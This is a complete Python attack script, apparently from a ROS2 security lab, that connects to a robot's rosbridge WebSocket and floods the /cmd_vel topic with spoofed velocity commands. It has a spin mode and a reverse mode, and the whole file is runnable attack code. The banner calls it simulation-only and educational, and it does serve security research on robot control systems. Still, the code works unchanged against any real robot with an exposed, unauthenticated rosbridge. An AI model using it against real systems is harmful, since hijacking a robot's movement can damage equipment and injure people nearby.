#!/usr/bin/env python3
"""
FILE: attack_message_injection.py
TYPE: ATTACKER VM Script (runs on ATTACKER VM - Ubuntu in VMware)
PURPOSE: Simulates a message injection (spoofing) attack.
         The attacker publishes fake /cmd_vel velocity commands to hijack
         robot movement, overriding the legitimate controller.

REQUIREMENTS (on Attacker VM):
    pip3 install roslibpy

HOW TO RUN:
    1. Ensure rosbridge is running on HOST: ros2 launch rosbridge_server rosbridge_websocket_launch.xml
    2. On the Attacker VM: python3 attack_message_injection.py --host <HOST_IP>
    3. Observe unexpected robot behavior in Gazebo

ATTACK TYPE: Message Injection / Command Spoofing
"""

import argparse
import time
import json
import threading
import sys

try:
    import roslibpy
except ImportError:
    print("[ERROR] roslibpy not installed. Run: pip3 install roslibpy")
    sys.exit(1)


class MessageInjectionAttack:
    def __init__(self, host: str, port: int = 9090):
        self.host = host
        self.port = port
        self.client = None
        self.running = False

    def connect(self):
        """Connect to the ROS bridge on the target host."""
        print(f"[ATTACKER] Connecting to ROS bridge at {self.host}:{self.port} ...")
        self.client = roslibpy.Ros(host=self.host, port=self.port)
        self.client.run()
        if self.client.is_connected:
            print(f"[ATTACKER] ✓ Connected to ROS bridge!")
        else:
            print("[ATTACKER] ✗ Connection failed. Is rosbridge running on the host?")
            return False
        return True

    def inject_spin_command(self, duration: float = 10.0):
        """
        ATTACK: Inject high-speed spin commands to confuse the robot.
        This overrides the legitimate controller by flooding /cmd_vel.
        """
        print(f"\n[ATTACK] Starting SPIN INJECTION on /cmd_vel for {duration}s...")
        print("[ATTACK] Robot should start spinning uncontrollably.")

        publisher = roslibpy.Topic(
            self.client,
            '/cmd_vel',
            'geometry_msgs/Twist'
        )

        self.running = True
        start_time = time.time()
        count = 0

        while self.running and (time.time() - start_time) < duration:
            # Inject command: max spin, no forward movement
            fake_cmd = {
                'linear': {'x': 0.0, 'y': 0.0, 'z': 0.0},
                'angular': {'x': 0.0, 'y': 0.0, 'z': 2.84}  # Max angular velocity
            }
            publisher.publish(roslibpy.Message(fake_cmd))
            count += 1
            if count % 10 == 0:
                print(f"[ATTACK] Injected {count} fake commands...")
            time.sleep(0.05)  # 20 Hz injection rate

        print(f"[ATTACK] Injection complete. Sent {count} fake commands.")
        publisher.unadvertise()

    def inject_reverse_command(self, duration: float = 10.0):
        """
        ATTACK: Force the robot to drive in reverse repeatedly.
        """
        print(f"\n[ATTACK] Starting REVERSE COMMAND INJECTION for {duration}s...")

        publisher = roslibpy.Topic(
            self.client,
            '/cmd_vel',
            'geometry_msgs/Twist'
        )

        self.running = True
        start_time = time.time()
        count = 0

        while self.running and (time.time() - start_time) < duration:
            fake_cmd = {
                'linear': {'x': -0.5, 'y': 0.0, 'z': 0.0},  # Reverse at full speed
                'angular': {'x': 0.0, 'y': 0.0, 'z': 0.0}
            }
            publisher.publish(roslibpy.Message(fake_cmd))
            count += 1
            time.sleep(0.05)

        print(f"[ATTACK] Reverse injection complete. Sent {count} commands.")
        publisher.unadvertise()

    def disconnect(self):
        if self.client and self.client.is_connected:
            self.client.terminate()
            print("[ATTACKER] Disconnected from ROS bridge.")


def main():
    parser = argparse.ArgumentParser(
        description='ROS2 Message Injection Attack Simulator'
    )
    parser.add_argument(
        '--host', type=str, default='192.168.1.100',
        help='IP address of the HOST machine running ROS2 (default: 192.168.1.100)'
    )
    parser.add_argument(
        '--port', type=int, default=9090,
        help='ROS bridge WebSocket port (default: 9090)'
    )
    parser.add_argument(
        '--attack', type=str, choices=['spin', 'reverse'], default='spin',
        help='Type of injection attack (default: spin)'
    )
    parser.add_argument(
        '--duration', type=float, default=15.0,
        help='Duration of attack in seconds (default: 15)'
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  ROS2 MESSAGE INJECTION ATTACK - SIMULATION ONLY")
    print("  For educational/research use in controlled environments")
    print("=" * 60)

    attacker = MessageInjectionAttack(host=args.host, port=args.port)

    if not attacker.connect():
        sys.exit(1)

    try:
        if args.attack == 'spin':
            attacker.inject_spin_command(duration=args.duration)
        elif args.attack == 'reverse':
            attacker.inject_reverse_command(duration=args.duration)
    except KeyboardInterrupt:
        print("\n[ATTACKER] Attack interrupted by user.")
    finally:
        attacker.disconnect()


if __name__ == '__main__':
    main()
